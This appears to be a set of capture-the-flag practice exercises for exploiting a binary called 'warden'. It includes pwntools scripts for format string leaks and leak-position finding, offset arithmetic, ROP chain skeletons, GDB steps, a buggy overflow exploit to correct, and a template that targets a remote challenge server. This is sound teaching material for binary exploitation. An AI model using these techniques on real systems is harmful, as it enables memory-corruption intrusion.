# Practical Exercises: Learn by Doing

## Exercise 1: Finding Format String Positions

**Goal**: Learn how to manually find format string leak positions

**Task**:
```python
from pwn import *

p = process('./warden')
p.recvuntil(b'breached.\n')

# Try different format strings to find positions
test_payloads = [
    b'AAAA.%p.%p.%p.%p.%p',
    b'AAAA.%1$p.%2$p.%3$p',
    b'%x.%x.%x.%x.%x.%x.%x.%x'
]

for payload in test_payloads:
    p = process('./warden')
    p.recvuntil(b'breached.\n')
    p.sendline(payload)
    output = p.recvuntil(b'Pow')
    print(f"Input: {payload}")
    print(f"Output: {output}\n")
    p.close()
```

**Questions**:
1. At what position do you see 0x41414141 (AAAA)?
2. Which position contains an address starting with 0x565xxxxx?
3. Which position contains a value ending in 00?

## Exercise 2: Calculate Offsets

**Goal**: Learn to calculate offsets from leaked addresses

**Task**:
```bash
# Find the offset of tft function
objdump -d warden | grep "<tft>:"
# Note: 00001423 <tft>:

# If you leak 0x56561433, what's the base?
# base = 0x56561433 - 0x1433 = 0x56560000

# Now calculate addresses:
# win = base + 0x1324
# braum = base + 0x12cd
```

**Practice**: Write a Python function to do this automatically.

## Exercise 3: Build a Simple ROP Chain

**Goal**: Understand ROP chain construction

**Task**: Build a ROP chain that calls just braum(0x1337), then exits.

```python
from pwn import *
context.arch = 'i386'

# Your code here:
# 1. Leak addresses
# 2. Build payload:
#    - Buffer + canary + saved regs
#    - braum address
#    - exit_plt address
#    - 0x1337 argument
#    - 0 (exit code)
```

**Challenge**: Make it work without crashes!

## Exercise 4: Debug with GDB

**Goal**: Learn to debug exploits

**Task**:
```bash
# Start GDB
gdb ./warden

# Set breakpoints
break *tft+0x34  # After first gets()
break *tft+0x52  # After second gets()

# Run and send your exploit
run < exploit_input.txt

# Examine stack
x/40wx $esp

# Check registers
info registers

# Continue
continue
```

**Questions**:
1. Where is the buffer located?
2. Where is the canary?
3. Where does the return address point?

## Exercise 5: Fix Common Mistakes

**Given this broken exploit, find and fix the bugs:**

```python
from pwn import *
context.arch = 'i386'

p = process('./warden')
p.recvuntil(b'breached.\n')

# BUG 1: Wrong format string
p.sendline(b'%1$x|%2$x')  # Wrong positions!
output = p.recvuntil(b'Pow Pow Pow\n')
values = output.split(b'|')

# BUG 2: Wrong parsing
code_leak = int(values[0])  # Missing hex conversion!
canary = int(values[1])

# BUG 3: Wrong offset
base = code_leak - 0x1234  # Wrong offset!

# BUG 4: Wrong buffer size
payload = b'A' * 30  # Too short!
payload += p32(canary)
payload += p32(0)
payload += p32(0)
payload += p32(base + 0x1324)

p.sendline(payload)
```

**Find all 4 bugs and fix them!**

## Exercise 6: Automate Offset Finding

**Goal**: Write a script that automatically finds the code leak position

```python
from pwn import *

def find_code_leak_position():
    """Try each position until we find a code pointer"""
    for pos in range(1, 20):
        p = process('./warden')
        p.recvuntil(b'breached.\n')
        p.sendline(f'%{pos}$08x'.encode())
        output = p.recvuntil(b'Pow')
        
        # Parse value
        value_str = output.split(b'Pow')[0].strip()
        try:
            value = int(value_str, 16)
            # Code pointers usually start with 0x56 or 0x55
            if 0x56000000 <= value <= 0x57000000:
                print(f"Found code leak at position {pos}: 0x{value:08x}")
                return pos
        except:
            pass
        
        p.close()
    
    return None

# Run it
position = find_code_leak_position()
print(f"Code leak is at position: {position}")
```

## Exercise 7: Understand Stack Layout

**Draw the stack layout for this program:**

```
High addresses
┌─────────────────┐
│                 │
│  Return address │ ← What does tft() return to?
│                 │
│  Saved EBP      │ ← Frame pointer
│                 │
│  Saved EBX      │ ← Register saved by tft()
│                 │
│  Canary         │ ← Stack protection
│                 │
│  Buffer[28:32]  │
│  Buffer[24:28]  │
│       ...       │
│  Buffer[0:4]    │ ← Your input goes here
│                 │
│  Local vars     │
│                 │
└─────────────────┘
Low addresses
```

**Task**: Label each section with:
- Byte offset from buffer start
- What we overwrite with
- Why it's important

## Exercise 8: Write Minimal Exploit

**Goal**: Write the shortest working exploit possible

**Rules**:
- Must leak addresses
- Must set all globals
- Must call win()
- Minimize lines of code

**Template**:
```python
from pwn import *
context.arch = 'i386'

p = remote('14.225.212.104', 9004)
p.recvuntil(b'breached.\n')

# Your exploit here (try to do it in < 20 lines)

p.interactive()
```

## Exercise 9: Adapt to Different Architectures

**Challenge**: What would change if this were x86-64 instead of i386?

**Consider**:
- Calling convention (registers vs stack)
- Address size (4 bytes vs 8 bytes)
- Padding requirements
- Available gadgets

**Task**: Rewrite the exploit for x86-64 (conceptually)

## Exercise 10: Advanced - Format String Write

**Challenge**: Use format string to write to globals instead of ROP

**Hint**: Use %n to write, but you need:
- Addresses on the stack (how to get them there?)
- Careful byte counting
- Multiple writes for each global

**This is advanced and may not fit in the buffer!**

---

## Solutions

Solutions are in the `solutions/` directory. Try the exercises first!

## Self-Assessment Checklist

Can you:
- [ ] Identify buffer overflows by reading assembly?
- [ ] Exploit format string vulnerabilities?
- [ ] Calculate addresses with PIE/ASLR?
- [ ] Build working ROP chains?
- [ ] Debug exploits with GDB?
- [ ] Adapt exploits for different environments?

If yes to all: You're ready for intermediate PWN challenges!
If no to some: Review those sections and practice more.

## Next Steps

1. Solve similar challenges on pwnable.kr
2. Try ROP Emporium challenges
3. Learn heap exploitation
4. Study advanced ROP techniques
5. Practice on CTF platforms regularly

Remember: **Understanding > Memorizing**

Good luck! 🎯
